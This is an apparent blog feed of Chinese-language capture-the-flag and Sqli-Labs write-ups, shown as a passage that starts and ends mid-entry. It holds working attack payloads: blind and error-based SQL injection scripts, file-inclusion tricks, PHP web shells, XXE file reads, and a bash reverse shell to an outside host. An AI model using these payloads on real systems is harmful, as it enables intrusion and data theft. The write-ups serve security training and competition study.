"(SELECT%09GROUP_CONCAT(countryID,0x3a,countryName,0x3a,scriptPath%09SEPARATOR%090x3c62723e)%09FROM%09countries)"def doubleSearch(leftNum,rightNum,i,target): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): payload = "' or (select ascii(substr(" +generateTarget(target) + " from "+ str(i) +" for 1))&lt;= "+str(midNum) +" )%23" # print payload recv = sendPayload(payload) # print recv if flag in recv: # print 'cuowu' # raw_input() doubleSearch(leftNum,midNum,i,target) else: # print 'chenggong' # raw_input() doubleSearch(midNum,rightNum,i,target) else: if rightNum != 0: # print rightNum # raw_input() sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): global findBit i = 1 findBit = 0 print "The database:" target = "database" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The tables:" target = "tables" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The columns:" target = "columns" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The data:" target = "data" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") breakexp() 得到数据库WHATAREYOUDOINGHERE中countries表中的数据：1234567891011countryID:countryName:scriptPath1:Germany:country/ge.php2:Turkmenistan:country/tu.php3:Netherlands:country/ne.php4:Serbia:country/se.php5:Turkey:country/tk.php6:France:country/fr.php7:UK:country/uk.php8:Russia:country/ru.php9:USA:country/us.php10:Canada:country/ca.php 读取源码接下来看看还能做啥。初步尝试发现应该是只有1列1http://tasks.ctf.com.ua:13372/index.php?country=Germany&apos; union select 1 -- - 1http://tasks.ctf.com.ua:13372/index.php?country=Germany&apos; union select 1,2 -- - 尝试使用php伪协议：1http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;php://filter/read=convert.base64-encode/resource=index.php&apos; -- - base64解码一下，其中有段code：123456789101112if (isset($_GET['country']))&#123; $link = mysqli_connect("127.0.0.1", "beeber", "eouejvnbinrwviewrJNHUFEjnkwfowe", "WHATAREYOUDOINGHERE"); $result = mysqli_query($link, "SELECT scriptPath FROM countries WHERE countryName='".$_GET['country']."';"); $res_include = $result-&gt;fetch_object()-&gt;scriptPath; //echo 'Get file: '.$res_include.'&lt;br&gt;&lt;br&gt;'; include $res_include;&#125;; include哪一个页面是根据从数据库中取出的脚本的路径决定的。根据我们前面利用脚本注出来的结果，我们看看country/ge.php中的源码：1234567&lt;?php $target_dir = "uploads/"; $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]); move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);?&gt; 从country/ge.php源码中，我们知道了文件上传后保存在uploads文件夹下，文件名也没有改变。 getflag姿势一直接上传php文件再去访问uploads下的文件是无法解析的。 可以利用zip协议或者phar协议来进行文件包含。 chybeta.php:123&lt;?php system('ls');?&gt; 打包成chybeta.zip，上传后访问：1http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;zip://uploads/chybeta.zip%23chybeta.php&apos; -- - 或者访问：1http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;phar://uploads/chybeta.zip/chybeta.php&apos; -- - 接下去我们利用php伪协议读取iulersiueruigfuihseruhgi.php的内容：1http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;php://filter/read=convert.base64-encode/resource=iulersiueruigfuihseruhgi.php 解码后得到flag：1h4ck1t&#123;$QL&amp;LFI=FR13ND$&#125; 姿势二chybeta.php:123&lt;?php system($_GET['chybeta']);?&gt; 上传后可以直接访问：1http://tasks.ctf.com.ua:13372/index.php?chybeta=ls&amp;country=&apos; union select &apos;uploads/chybeta.php&apos; -- - 1view-source:http://tasks.ctf.com.ua:13372/index.php?chybeta=cat iulersiueruigfuihseruhgi.php&amp;country=&apos; union select &apos;uploads/chybeta.php&apos; -- -]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hackit2017-B3tterS0ci4lN3twork-writeup]]></title>
      <url>%2F2017%2F08%2F28%2FHackit2017-B3tterS0ci4lN3twork-writeup%2F</url>
      <content type="text"><![CDATA[Hackit2017-B3tterS0ci4lN3twork-writeup命令注入wget-cve利用 Task1234Description: You know what to do!Attachment: (none)Webpage: http://tasks.ctf.com.ua:13374Hint: Try to find some known cves) Hide 有一个注册Register功能，和登陆Auth功能。 在注册完成并登录后，会跳到profile.php页面： 右上角有Send Message和Get Message功能。我们试着写一条信息发送给自己： 然后到Get Message功能处，发现是存在XSS漏洞的。 但经过一番测试，这里没办法进一步的利用。回到profile.php。这里有两个功能，一个是修改密码，另一个是根据你填入的图片地址获得Your avatar。 这里我们填上一张放在自己服务器上的图片 提交后用burp看一下： 查看服务器log，发现是wget/1.15： 所以服务器端应该是用wget 我们填入图片的地址，然后保存到avatars/yourhost/xx.jpg。而且只允许jpg/png/gif。若是php文件，在被wget完成后检测后会被删除。 Solution1从上面的图片来看，假设后端的wget语句(约莫)如下：1wget -r -P avatars -A &apos;*.jpg,*.png,*.gif&apos; $url 而$url是我们可以控制的，那可以尝试注入比如换行符，比如令$URL=http://xx.com/a.jpg\nwhoami，让后端执行时变成：12wget -r -P avatars -A &apos;*.jpg,*.png,*.gif&apos; http://xx.com/a.jpgwhoami 从而导致命令注入。经过fuzz，换行符\n没有过滤，制表符\t没有过滤可用来代替空格。 我们在自己的服务器上放一个jpg文件，之所以用jpg做后缀是因为在wget完后，wget命令会检测指定后缀名，若不是，则会删掉。 其内容是：1/bin/bash -i &gt; /dev/tcp/yourhost/port 0&lt;&amp;1 2&gt;&amp;1 服务器端将使用wget将图片下载到 avatars/yourhost/xx.jpg 的位置，然后我们再利用bash去加载avatars/yourhost/xx.jpg来获得一个shell。最后的exp如下： 1234567891011import requestscookie = &#123;"PHPSESSID":"uchf0tsmo9fnpvgjllo67kr9k1"&#125;payload = "http://yourhost/chybeta.jpg\nbash\tavatars/yourhost/chybeta.jpg"url = "http://tasks.ctf.com.ua:13374/profile.php"data = &#123;"password":"","new_password":"","avatar_url":payload&#125;requests.post(url,cookies=cookie,data=data) 然后在自己的服务器上监听端口:1nc -vv -l -p 24853 运行python脚本，得到shell。 flag：1h4ck1t&#123;h4ck1t&#123;wg3t_cv3_1n_CTF&#125; Solution2wget的版本是1.15，这个在pwnhub-another-php中出现过，利用CVE-2016-70981Race condition in wget 1.17 and earlier, when used in recursive or mirroring mode to download a single file, might allow remote servers to bypass intended access list restrictions by keeping an HTTP connection open. 参考文章：Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098 也就是说利用竞争条件，在wget的链接还没结束前，它对后缀名的检测就不会触发，这样赶在这段时间内服务器wget后的webshell其实是存在的。 但我没成功。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[HackCon2017-Steg-writeup]]></title>
      <url>%2F2017%2F08%2F27%2FHackCon2017-Steg-writeup%2F</url>
      <content type="text"><![CDATA[HackCon2017-Steg-writeup Standard Steg12I hacked my friend&apos;s facebook, by seeing his chrome password. I am smart, right?Anyways, he sent this image to one of his friends, idk what it is, looks like a useless logo, can you check? 123456789101112131415161718192021222324def asciiToBin(ascii): return ''.join(str(bin(ord(byte)))[2:].zfill(8) for byte in ascii)def hide(img, data, outName): header, trailer = 2*"11001100",2*"0101010100000000" dataBin = header+asciiToBin(data)+trailer pixels, mode = list(img.getdata()), img.mode newPixels = [] for i in range(len(dataBin)): newPixel = list(pixels[i]) newPixel[i%len(mode)] = setLSB(newPixel[i%len(mode)], dataBin[i]) newPixels.append(tuple(newPixel)) newData = newPixels + pixels[len(newPixels):] img.putdata(newData) img.save(outName, "PNG")def setLSB(target, value): binary = str(bin(target))[2:] if binary[-1] != value: binary = binary[:-1] + value return int(binary, 2)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[HackCon2017-Web-writeup]]></title>
      <url>%2F2017%2F08%2F27%2FHackCon2017-Web-writeup%2F</url>
      <content type="text"><![CDATA[HackCon2017-Web-writeup Noobcoder12345A junior recently started doing PHP, and makes some random shit. He uses gedit as his go-to editor with a black theme thinking it was sublime.So he made this login portal, I am sure he must have left something out. Why don&apos;t you give it a try?Server: http://defcon.org.in:6062Note: dirbuster is NOT required for this question 存在文件checker.php~，下载下来后打开：123456&lt;?phpif ($_POST["username"] == $_POST["password"] &amp;&amp; $_POST["password"] !== $_POST["username"]) echo "congratulations the flag is d4rk&#123;TODO&#125;c0de";else echo "nice try, but try again";?&gt; 存在弱类型比较问题，payload：1username=0e1&amp;password=0e2 得到flag：1d4rk&#123;l0l_g3dit_m4ster_roxx&#125;c0de Magic12345Everything disappears magically.Can you magically prevent that?http://defcon.org.in:6060/index.phpNote: dirbuster is NOT required for this question 有一个登陆框，但初尝后没有发现注入。 抓包看看，有一些奇怪的set-cookie： 将所有的setcookie保存到cookie.txt中，用脚本将其中的字符提取出来：1234567891011121314import osimport refrom urllib import unquotecontent = open("cookie.txt","rb").read()reg = r'=(.+?); expires='cookiere = re.compile(reg)cookielist = re.findall(cookiere,content)result = ""for i in cookielist: result += unquote(i)print result 运行后得到：1++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++.--.--------------.+++++++++++++.----.-------------.++++++++++++.--------.&lt;------------.&lt;++.&gt;&gt;----.+.&lt;+++++++++++.+++++++++++++.&gt;+++++++++++++++++.---------------.++++.+++++++++++++++.&lt;&lt;.&gt;&gt;-------.&lt;+++++++++++++++.&gt;+++..++++.--------.+++.&lt;+++.&lt;++++++++++++++++++++++++++.&lt;++++++++++++++++++++++.&gt;++++++++++++++..&gt;+.----.&gt;------.+++++++.--------.&lt;+++.&gt;++++++++++++..-------.++. 用brainfuck编译器解释后：12λ .\brainfuck.exeusername: abERsdhw password: HHealskdwwpr 得到用户名和密码，登陆，得到flag：1d4rk&#123;c00k13s_4r3_fun&#125;c0de Dictator123456A dictator is creating a lot of fuss nowadays by claiming to have nuclear weapons. I somehow got access to his personal website that he uses to send instructions, but I cannot get in. Can you try?Link: Website(http://defcon.org.in:6063/)Hint: you need to be living in that country to get access.Hint2: north korea 直接访问会提示Access denied，修改Accept-Language也没用。 修改X-Forwarded-For为north korea的ip。修改User-Agent为north korea的浏览器NaenaraBrowser。 Stolen Calculator - PWN123I stole this calculator from someone and made some changes because I am the plagiarism god. Bow before me now.btw wanna try it: http://defcon.org.in:9080/Hint: This is a pwn challenge]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XNUCA2017-第一期：Web-writeup]]></title>
      <url>%2F2017%2F08%2F26%2FXNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup%2F</url>
      <content type="text"><![CDATA[XNUCA2017-第一期：Web-writeup 难度中等偏下 题目类型：CTF题，渗透/模板题 No.1 你喜欢颜文字么123456关键字词：一档CTF题===============================================================Lloowweerrxx是个喜欢用代码仓库的好孩子f3e6cc87187fe797bf8c89e7688c1039.xnuca.cn 看到代码仓库，想到github，访问：1https://github.com/lloowweerrxx/ 发现有12345678910111213$safeanswer = $_POST['safeanswer'];$safequestion = $_POST['safequestion'];$turequestion = intval(0);$tureanswer = intval(0);if(empty($safequestion))&#123; die("安全问题不能为空！");&#125;if(empty($safeanswer))&#123; die("安全问题答案不能为空！");&#125;if($tureanswer == $safeanswer &amp;&amp; $turequestion == $safequestion)&#123; echo $flag;&#125; 得到flag：1xnuca&#123;921e440934d87e45f37e3ec2081f9735&#125; No.2 让你无语的md5123456关键字词：一档CTF题===============================================================Pav1遇到不会的md5很喜欢去百度一下无语的md5e5a5dc7404c4e4dad32e4556ac2588b6.xnuca.cn 查看源代码：12&lt;!--pav1和lloowweerrxx经常因为用同一个账号而吵起来--&gt;&lt;!--pav1建数据库喜欢用默认的latin1，lloowweerrxx写程序的时候set了一下utf8,他们好像又吵起来啦--&gt; 输入：admin(即admin后面有好多空格)，得到： 然后去 https://somd5.com/ 查询，得到：1xnuca&#123;0c7b5781935082833f6487a69d81404b&#125; No.3 Pav1和lloowweerr…123456关键字词：二档CTF题===============================================================听说pav1不小心放了一个flag文件在/home/user下，而且忘了加扩展名9f264492ec95b853dec810609f875c3b.xnuca.cn 很明显，ffmpeg任意文件读取漏洞，参考1http://www.freebuf.com/column/142775.html 运行：1python3 gen_xbin_avi.py file:///home/user/flag chybeta.avi 然后上传到网站上，最后下载下来 观看 1xnuca&#123;7bed46c5c61c0ac625cebf8a9922cc48&#125; No.4 X-NUCA 2017’s S…123456关键字词：二档CTF题===============================================================X-NUCA 2017’s Secretsa4b359466421ae3aa76a8b116dda3870.xnuca.cn 这个没做出来。 No.5 Lucky Number Ca…123456关键字词：一档CTF题===============================================================Lucky Number Calcf83f119af64fa2b94c37231bbce09678.xnuca.cn 填入后，抓包12345678910111213POST /ctf1.php HTTP/1.1Host: f83f119af64fa2b94c37231bbce09678.xnuca.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://f83f119af64fa2b94c37231bbce09678.xnuca.cn/Content-Length: 30Connection: close&lt;user&gt;&lt;name&gt;aaaa&lt;/name&gt;&lt;/user&gt; xml的形式，就觉得是xxe漏洞，不过早上弄得时候没弄出来。下午lzhtony给了一个能读取文件的payload，但没发现flag在哪。 然后就开始找咯，对照自己的linux的目录一个一个翻，最后12345678910111213141516POST /ctf1.php HTTP/1.1Host: f83f119af64fa2b94c37231bbce09678.xnuca.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://f83f119af64fa2b94c37231bbce09678.xnuca.cn/Content-Length: 134Connection: close&lt;!DOCTYPE ANY [&lt;!ENTITY x SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/hosts&quot;&gt;]&gt;&lt;user&gt;&lt;name&gt;&amp;x;&lt;/name&gt;&lt;/user&gt; 解码得：1234567127.0.0.1 localhost127.0.0.1 xnuca&#123;N3sSMD165KesSXlyOgwMGTepI2HTJC0b&#125;.xip.io# The following lines are desirable for IPv6 capable hosts::1 localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allrouters flag：1xnuca&#123;N3sSMD165KesSXlyOgwMGTepI2HTJC0b&#125; 看这个flag的位置和hosts的配置，感觉是要利用xxe来探测内网来获得flag的。 No.6 Hello World1234567关键字词：二档CTF题===============================================================即使是Hello world也要好好管理代码！91101217df5a534c58f8b0e0922e1161.xnuca.cn 说要管理代码，git泄露。1perl rip-git.pl http://91101217df5a534c58f8b0e0922e1161.xnuca.cn/.git 没做出来。 No.8 看视频真嗨皮12695c354c811a33d792d9e0efb2305cfb.xnuca.cn请在目标入口/writeHere/目录下创建名为00111e86d51fa2b62add879572a0d29e的文件 海洋cms，见了好多次了。创建文件的payload如下：1234http://695c354c811a33d792d9e0efb2305cfb.xnuca.cn/writeHere/00111e86d51fa2b62add879572a0d29ePOST:searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=file_put_contents(&quot;writeHere/00111e86d51fa2b62add879572a0d29e&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;); 查找flag的payload如下：1234view-source:http://695c354c811a33d792d9e0efb2305cfb.xnuca.cn/search.php?searchtype=5POST:searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=system(&quot;find / | grep flag&quot;); 读取flag的payload如下：1234view-source:http://695c354c811a33d792d9e0efb2305cfb.xnuca.cn/search.php?searchtype=5POST:searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=system(&quot;cat /etc/flag.txt&quot;); 得到flag：1xnuca&#123;36d1ecfbe0fc9b79054ff70bb204af25&#125; No.9 The Best Commun…196433e53a974329f13590be3e215aebd.xnuca.cn 查到：1https://www.exploit-db.com/exploits/40756/ 利用里面的exp进行获取flag：1234567890x4148@96433e53a974329f13590be3e215aebd.xnuca.cn# cat /etc/flag.txtxnuca&#123;123e5ebb3f34a07990e477e85eb60170&#125;0x4148@96433e53a974329f13590be3e215aebd.xnuca.cn# echo &quot;a&quot; &gt; ../writeHere/00111e86d51fa2b62add879572a0d29e0x4148@96433e53a974329f13590be3e215aebd.xnuca.cn# ls ../writeHere/00111e86d51fa2b62add879572a0d29e No.11 两只小蜜蜂啊123adee757b88f7716820dc6d9bec43684d.xnuca.cn请在目标入口/writeHere/目录下创建名为00111e86d51fa2b62add879572a0d29e的文件 查到：1https://bbs.ichunqiu.com/thread-13977-1-1.html 利用文章里的exp，成功获取到shell。然后就拿到flag了。不过忘记截图了。 No.12 社工库12345关键字词：二档靶标题===============================================================社工之余吃个芒果休息一下吧！ 没做出来。 No.18 “开讲啦”查到：1https://www.exploit-db.com/exploits/24869/ 访问:1234http://8d52640a73d8073066c951df0501184a.xnuca.cn/oauth/lti/common/tool_provider_outcome.phpPOST:grade=1&amp;key=1&amp;secret=secret&amp;sourcedid=1&amp;submit=Send%20Grade&amp;url=/etc/flag.txt 得到flag：1xnuca&#123;Co8n0g5r72a4tul3at2ions!Y0ug0tMe&#125; 但是因为只找到任意文件读取漏洞，所以只能做读取flag的操作。写的操作没有成功。 No.23 找入口1http://www.websecgeeks.com/2015/08/wolf-cms-arbitrary-file-upload-to.html 弱密码：admin：admin 登陆后直接上传k.php，内容为：1&lt;?php eval($_GET['AAA']) ?&gt; 访问，写入文件1http://cef033ea85498682c1c33309def1a109.xnuca.cn/public/k.php?AAA=file_put_contents(&quot;writeHere/00111e86d51fa2b62add879572a0d29e&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;); 访问，读取flag。1http://cef033ea85498682c1c33309def1a109.xnuca.cn/public/k.php?AAA=system(&quot;cat /etc/flag.txt&quot;); flag：1xnuca&#123;24567gtfvretyasdsgrtyjyufdgrth23&#125; No.24 可爱的星星12337af3efae1d906343d29b6b1a96fcd54.xnuca.cn请在目标入口/writeHere/目录下创建名为00111e86d51fa2b62add879572a0d29e的文件 没做出来。 No.25 愉快的玩耍吧重置Admin密码为1234567： 1/admin/login/login_check.php?met_cookie_filter[a]=a%27,admin_pass=md5(1234567)+where+id=1;+%23-- 登录，并上传一个压缩了一句话php文件的压缩包到以下地址，会自动解压 1/admin/include/uploadify.php?type=skin&amp;wate=undefined&amp;module=undefined&amp;lang=cn 插入一句话的代码是 1&lt;?php $e = $_REQUEST['e']; $arr = array($_REQUEST['pass'],); array_filter($arr, base64_decode($e)); ?&gt; 用以下地址得到shell： 1/templates/test.php?e=YXNzZXJ0 然后读取/etc/flag.txt，并写入文件即可。 小结吐槽点： 比赛服务器：） 扫一扫就被办：） 重点是找poc/exp…..]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[流量包提取文件方法]]></title>
      <url>%2F2017%2F08%2F25%2F%E6%B5%81%E9%87%8F%E5%8C%85%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95%2F</url>
      <content type="text"><![CDATA[流量包提取文件方法 wiresharkwrieshark自带有文件分离功能。 tcpxtract通过下面命令安装：1apt-get install tcpxtract 使用方法：1tcpxtract -f XXX.pcap 以hitctf2017的Cephalopod为例123root@chybeta:~/Desktop/hitb2017/misc/Cephalopod# tcpxtract -f 2a9c1cdd-2ac0-4b2a-828d-269c6e04ebbb.pcapFound file of type &quot;png&quot; in session [10.0.2.7:49818 -&gt; 10.0.2.10:36890], exporting to 00000000.pngFound file of type &quot;png&quot; in session [10.0.2.7:49818 -&gt; 10.0.2.10:36890], exporting to 00000001.png 即可得到藏在流量包里的文件： foremostforemost是基于文件头及尾部信息恢复文件的工具。 使用方法：1foremost -i XXX.pcap 以hitbctf2017的simple_transfer为例 12345678root@chybeta:~/Desktop/hitb2017/misc/simple_transfer# foremost -i b48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcapProcessing: b48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcap|*|root@chybeta:~/Desktop/hitb2017/misc/simple_transfer# lsb48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcap outputroot@chybeta:~/Desktop/hitb2017/misc/simple_transfer# cd output/root@chybeta:~/Desktop/hitb2017/misc/simple_transfer/output# lsaudit.txt pdf 即可恢复出藏在流量包里的文件。 Network miner下载地址：https://sourceforge.net/projects/networkminer/ 还有一些方法，遇到后再慢慢补充。 Refference CTF取证类题目指南 返璞归真——流量中提取文件的五种方法 Four ways to extract files from pcaps awesome-pcaptools]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[HITB CTF 2017-Dating in Singapore-writeup]]></title>
      <url>%2F2017%2F08%2F24%2FHITB-CTF-2017-Dating-in-Singapore-writeup%2F</url>
      <content type="text"><![CDATA[HITB CTF 2017-Dating in Singapore-writeup Task101081522291516170310172431-050607132027162728-0102030209162330-02091623020310090910172423-02010814222930-0605041118252627-0203040310172431-0102030108152229151617-04050604111825181920-0108152229303124171003-261912052028211407-04051213192625 Solution根据分隔符-分开每行，并且两两数字一组：123456789101112131415161718192021222301 08 15 22 29 15 16 17 03 10 17 24 3105 06 07 13 20 27 16 27 2801 02 03 02 09 16 23 3002 09 16 23 02 03 10 09 09 10 17 24 2302 01 08 14 22 29 3006 05 04 11 18 25 26 2702 03 04 03 10 17 24 3101 02 03 01 08 15 22 29 15 16 1704 05 06 04 11 18 25 18 19 2001 08 15 22 29 30 31 24 17 10 0326 19 12 05 20 28 21 14 0704 05 12 13 19 26 25 数字的特征，最小为01，最大为31，一共十二行，恰对应12个月，每个月最多31天。结合今年（2017）日历 第一行：101 08 15 22 29 15 16 17 03 10 17 24 31 对照一月份，“写出”得到字母：H。 其余类似。 最后的flag：1HITB&#123;CTFFUN&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less17-writeup]]></title>
      <url>%2F2017%2F08%2F23%2FSqli-Labs-Less17-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labs是用来练习sql注入的好平台。project地址：https://github.com/Audi-1/sqli-labs本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53 Less-17 POST-Update Query-Error Based-String 基础知识三种基本语句。 INSERT123INSERT INTO table_name ( field1, field2,...fieldN ) VALUES ( value1, value2,...valueN ); 示例：123456789101112mysql&gt; desc users;+----------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+----------------+| id | int(3) | NO | PRI | NULL | auto_increment || username | varchar(20) | NO | | NULL | || password | varchar(20) | NO | | NULL | |+----------+-------------+------+-----+---------+----------------+3 rows in set (0.06 sec)mysql&gt; insert into users(id,username,password) value(0,&quot;chybeta&quot;,&quot;chybeta&quot;);Query OK, 1 row affected (0.09 sec) UPDATE12UPDATE table_name SET field1=new-value1, field2=new-value2[WHERE Clause] 示例12345678910111213141516171819202122232425262728293031mysql&gt; select id,username,password from users where id=15; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 15 | chybeta | chybeta | +----+----------+----------+ 1 row in set (0.00 sec) mysql&gt; update users set username=&quot;atebyhc&quot; where id=15; Query OK, 1 row affected (0.08 sec) Rows matched: 1 Changed: 1 Warnings: 0 mysql&gt; select id,username,password from users where id=15; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 15 | atebyhc | chybeta | +----+----------+----------+ 1 row in set (0.00 sec) mysql&gt; update users set username=&quot;chybeta&quot;,password=&quot;atebyhc&quot; where id=15; Query OK, 1 row affected (0.00 sec) Rows matched: 1 Changed: 1 Warnings: 0 mysql&gt; select id,username,password from users where id=15; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 15 | chybeta | atebyhc | +----+----------+----------+ 1 row in set (0.00 sec) DELETE1DROP TABLE table_name ; 这个。。暂时先不演示了。。 Less 17这题的题目为：[PASSWORD RESET] 。可以推测后端的语句为UPDATE型，约莫如下：1update users set password=新密码 where username=账号； 我们post数据为：1uname=admin&amp;passwd=chybeta&apos;&amp;submit=Submit 则发现有报错回显：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;admin&apos;&apos; at line 1 为单引号，所以可以推测语句为：1update users set password=&apos;$password&apos; where username=&apos;$username&apos;； 接下去进行报错注入。 updatexml()1UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：改变文档中符合条件的节点的值(以上来自学习笔记 UpdateXml() MYSQL显错注入) payload:1uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#&amp;submit=Submit 可以获取数据库名为：security。 但要获取数据：1uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM users limit 0,1),0x7e),1)#&amp;submit=Submit 却会显示：1You can&apos;t specify target table &apos;users&apos; for update in FROM clause 也就是说不能用update获取当前表的数据，因为update的子查询中不能出现相同的表名。 这个可以先新建一张表，然后再在这个新建的临时表中进行查询：1uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT group_concat(0x23,username,0x3a,password,0x23) FROM (select * from users)tmp),0x7e),1)#&amp;submit=Submit 这在sql.log中的语句为：1UPDATE users SET password = &apos;chybeta&apos; and updatexml(1,concat(0x7e,(SELECT group_concat(0x23,username,0x3a,password,0x23) FROM (select * from users)tmp),0x7e),1)#&apos; WHERE username=&apos;admin&apos; 其中(select * from users)tmp新建了一张tmp表，外面的SELECT...FROM..是从tmp中获取数据。 updatexml有长度限制,最长32位 extractvalue()payload:1uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,database()))#&amp;submit=Submit 得到数据库名称为 security 查字段：1uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns where table_name = &quot;users&quot;)))#&amp;submit=Submit 获取账号密码：1uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(0x23,username,0x23,password) FROM (select * from users)tmp)))#&amp;submit=Submit 对应的后端查询语句为：1UPDATE users SET password = &apos;chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns where table_name = &quot;users&quot;)))#&apos; WHERE username=&apos;admin&apos; extractvalue也有长度限制,最长32位 Refference 利用insert，update和delete注入获取数据]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less15~16-writeup]]></title>
      <url>%2F2017%2F08%2F23%2FSqli-Labs-Less15-16-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labs是用来练习sql注入的好平台。project地址：https://github.com/Audi-1/sqli-labs本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53 Less-15 POST- Blind-Boolian/time Based -Single quotesLess-16 POST- Blind-Boolian/time Based -Double quotes Less 15这关是盲注。没有回显。 payload：1uname=admin&apos; and 1=1#&amp;passwd=chybeta&amp;submit=Submit 之后根据页面的登陆与否，即是否有flag.jpg图片出现。构造逻辑语句利用脚本注入。 Less 16payload：1uname=admin&quot;) and 1=1#&amp;passwd=chybeta&amp;submit=Submit 登陆成功。 之后根据页面的登陆与否，构造逻辑语句利用脚本注入。 下面给个基于Less 16的脚本：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import requestsimport stringimport sysglobal findBitdef sendPayload(payload): proxy = &#123;"http":"http://127.0.0.1:8080"&#125; url = "http://localhost:20000/sqllab/Less-16/index.php" data = "uname=" + payload + "&amp;passwd=chybeta&amp;submit=Submit" headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125; content = requests.post(url,data=data,headers=headers,proxies=proxy) return content.textflag = "flag.jpg"def generateTarget(flag): if flag == "database": return "database()" elif flag == "tables": return "(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=0x786d616e)" elif flag == "columns": return "(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x6374665f7573657273)" elif flag == "data": return "(SELECT%09GROUP_CONCAT(gpass%09SEPARATOR%090x3c62723e)%09FROM%09ctf_users)"def doubleSearch(leftNum,rightNum,i,target): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): payload = 'admin") and%09(%09select%09ascii(substr(' +generateTarget(target) +"%09from%09"+ str(i) +"%09for%091))&lt;="+str(midNum) +")%23" recv = sendPayload(payload) if flag in recv: doubleSearch(leftNum,midNum,i,target) else: doubleSearch(midNum,rightNum,i,target) else: if rightNum != 0: sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): global findBit i = 1 findBit = 0 print "The database:" target = "database" while i : doubleSearch(-1,255,i,target) i += 1 if findBit 